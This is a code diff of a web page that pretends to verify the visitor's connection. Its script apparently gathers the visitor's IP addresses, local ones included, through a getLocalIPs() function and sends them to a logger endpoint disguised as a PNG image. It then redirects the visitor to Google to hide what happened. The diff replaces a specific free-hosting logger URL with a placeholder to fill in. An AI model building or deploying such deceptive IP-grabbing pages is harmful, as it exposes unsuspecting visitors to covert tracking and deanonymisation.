@@ -11,10 +11,9 @@
     <p>Please wait while we verify your connection...</p>
 
     <script>
-    // ========== ONLY CHANGE THE REDIRECT IF NEEDED ==========
-    const LOGGER_URL = 'http://smoq3.freehosting.dev/logger.php/screenshot.png';  // ← looks like a PNG
-    const REDIRECT_TO = 'https://www.google.com';                                // ← where they land after
-    // ======================================================
+    // ========== UPDATE THIS WITH YOUR LOGGER URL (WITH HTTPS) ==========
+    const LOGGER_URL = 'https://YOUR-LOGGER-DOMAIN.com/logger.php/screenshot.png';
+    const REDIRECT_TO = 'https://www.google.com';
     const DELAY_MS = 2000;
 
     function getLocalIPs() {
